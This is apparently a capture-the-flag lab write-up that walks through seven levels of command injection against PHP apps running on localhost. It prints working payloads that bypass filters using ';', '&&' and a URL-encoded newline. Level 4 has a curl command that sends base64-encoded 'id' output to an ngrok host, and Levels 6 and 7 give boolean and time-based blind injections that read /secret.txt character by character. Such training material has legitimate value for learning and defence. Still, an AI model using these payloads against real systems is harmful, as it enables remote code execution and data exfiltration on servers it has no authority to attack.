[Level 1] Target: http://localhost:3001
	
	- Let look at index.php file 
	
	if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
		switch($command) {
			case "ping":
				$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
				break;
			case "nslookup":
				$result = shell_exec("timeout 10 nslookup $target 2>&1");
				break;	
			case "dig":
				$result = shell_exec("timeout 10 dig $target 2>&1");
				break;
		}
		die($result);
    	}
    	
    	// shell_exec() execute command from user
    	
    	=>> you can see, there is simple lab, no protect shell
    	
    	=>> shell_exec("timeout 10 ping -c 4 127.0.0.1;id 2>&1")
    	
    	=>> or you just type ;id , and your goal is done
    	
    	FINAL RESULT: RCE  uid=33(www-data) gid=33(www-data) groups=33(www-data)
    	
    	
[Level 2] Target: http://localhost:3002

	- Let see, it still the same with the previous level, but this time it has filter to block ";"
	...
	if (strpos($target, ";") !== false) 
            die("Hacker detected!");
    	...
    	
    	But you know about coding or command line right! they are not block &&
    	
    	=>> shell_exec("timeout 10 ping -c 4 127.0.0.1 && id 2>&1")
    	
    	PING 127.20.0.1 (127.20.0.1): 56 data bytes
	64 bytes from 127.20.0.1: icmp_seq=0 ttl=64 time=0.679 ms
	64 bytes from 127.20.0.1: icmp_seq=1 ttl=64 time=0.079 ms
	64 bytes from 127.20.0.1: icmp_seq=2 ttl=64 time=0.078 ms
	64 bytes from 127.20.0.1: icmp_seq=3 ttl=64 time=0.078 ms
	--- 127.20.0.1 ping statistics ---
	4 packets transmitted, 4 packets received, 0% packet loss
	round-trip min/avg/max/stddev = 0.078/0.228/0.679/0.260 ms
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
    	
    	FINAL RESULT: RCE 
    	
    	
[Level 3] Target: http://localhost:3003

	
    	- This time is a real challenge right! 
    	
    	...
    	 if (strpos($target, ";") !== false) 
            die("Hacker detected!");
        if (strpos($target, "&") !== false) 
            die("Hacker detected!");
        if (strpos($target, "|") !== false) 
            die("Hacker detected!");
        ...
        
        - No way to exploit, but there is a trick, you can you url encode, a enter between two command is still work,
        - When you copy and paste  it into your shell
        khanh@kali:~/Desktop$ pwd
        whoami
        /home/khanh/Desktop
        khanh

    	=>> url encode of "enter" is %0A, use burp suite to exploit it
    	
    	POST /index.php HTTP/1.1
	Host: localhost:3003
	Content-Length: 42
	...
	command=ping&target=127.0.0.1+%0A+id
    	
    	PING 127.0.0.1 (127.0.0.1): 56 data bytes
	64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.201 ms
	64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.076 ms
	64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.153 ms
	64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.094 ms
	--- 127.0.0.1 ping statistics ---
	4 packets transmitted, 4 packets received, 0% packet loss
	round-trip min/avg/max/stddev = 0.076/0.131/0.201/0.049 ms
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
    	
    	FINAL RESULT: RCE
    	
[Level 4] Target: http://localhost:3004

    	
    	- Let take a look at index.php file 
    	
    	...
    	if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                if ($result !== null && strpos($result, "zip error") === false)
                    die("Backup thành công");
                else
                    die("Backup không thành công");
				break;
    	...
    	
    	- There are no chance to see any thing on screen 
    	
    	=>> But you can use ngrok to make a http tunel because you are working with docker, python3 -m http.server is not a good choice
    	
    	=>> shell_exec("timeout 3 zip /tmp/; curl "https://f06e-14-231-191-105.ngrok-free.app/$(id | base64)"; -r /var/www /html/index.php 2>&1")
    	
    	
    	Forwarding                    https://f06e-14-231-191-105.ngrok-free.app -> http://localhost:8888   
                                                                                                    
	Connections                   ttl     opn     rt1     rt5     p50     p90                           
	                              1       0       0.00    0.00    0.00    0.00                          
                                                                                                    
	HTTP Requests                                                                                       
	-------------                                                                                       
                                                                                                    
	GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK      502 Bad Gateway  
    	
    	=>> dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK is a base64 encoded, decode it to see uid=33(www-data) gid=33(www-data) groups=33(www-data)
    	
    	
    	FINAL RESULT RCE
    	
    	
[Level 5] Target: http://localhost:3005

	
    	- Did you check the index.php file? nothing change right! so  what is the different between the previous lab with this one?
    	- Let see in some conf files
    	...
    	level05-proxy:
    	image: nginx:stable
    	ports:
      	- "3005:80"
    	volumes:
      	- ./cmdi_level5/config/nginx.conf:/etc/nginx/conf.d/default.conf
    	restart: always
    	networks:
      	- internet
      	- no-internet
      	...
      	=>> docker-compose.yml file shows that no internet in this lab, so ngrok is not work, but there is a way to find the sollution
    	- Dockerfile has interesting things right =))
    	
    	# config permission
	RUN chown -R root:www-data /var/www/html // www-data can read
	RUN chmod 750 /var/www/html
	RUN find . -type f -exec chmod 640 {} \;
	RUN find . -type d -exec chmod 750 {} \;
	RUN chmod g+w /var/www/html/
	RUN chmod +t -R /var/www/html/
    	
    	- The www-data group has read and execute access to directories, read access to files, and write access to the /var/www/html directory
    	=>> That's all 
    	
    	=>> shell_exec("timeout 3 zip /tmp/; touch output.txt; echo "$(pwd)" > output.txt ; -r /var/www /html/index.php 2>&1")
    	=>> curl http://localhost:3005/output.txt => /var/www/html
    	
    	FINAL RESULT: RCE
    	
[Level 6] Target: http://localhost:3006

	- This lab is the same with the previous lab, but the last payload is not work here
	- Let see in docker-compose.yml file	
	
	...
	level06:
    	build: ./cmdi_level6
    	container_name: 'cmdi_level06'
    	restart: 'unless-stopped'
    	volumes: 
    	  # using :ro to prevent write file, dont remove this :(
     	 - ./cmdi_level6/src/:/var/www/html/:ro
    	networks:
      	- no-internet
        ...
      
    	=>> No way to write file :((
    	
    	- Let see in index.php file 
    	...
    	case "backup":
                $result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                if ($result !== null && strpos($result, "zip error") === false)
                    die("Backup thành công");
                else
                    die("Backup không thành công");
				break;
    	... 
    	- I think the only way to solve this level is boolean check
    	- Let change the source code a little bit at $target
    	
    	fake.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then echo ""; else echo "zip error"; fi ; #
    	
    	- If the character is correct, it print out on the screen "Back up thanh cong" and if not "Back up khong thanh cong"
    	
    	=>> It take a lot of time, so let make a list of characters and fuzz them in burp suite 
    	
    	FINAL RESULT: read the content of the flag CBJS{FAKE_FLAG_FAKE_FLAG}
    	
    	
[Level 7] Target: http://localhost:3007

	- This lab is the same with the previous lab expect for these lines in index.php file 
	
	...
	case "backup":
                # Backup to /tmp/ folder and prevent writable to document root 
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                die("Đã chạy câu lệnh backup");
                break;
        ...
        
        No chance to see whatever printed out on screen - it's so bad right :((
        
        test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then sleep 5; else echo sleep 0; fi ; #
        
        This way is quite same to the the previous way, if your character is correct, it took 5 seconds to see the output on the screen
        =>> Let try to see the content of the flag =))
        
        FINAL RESULT: read the content of the flag CBJS{FAKE_FLAG_FAKE_FLAG}
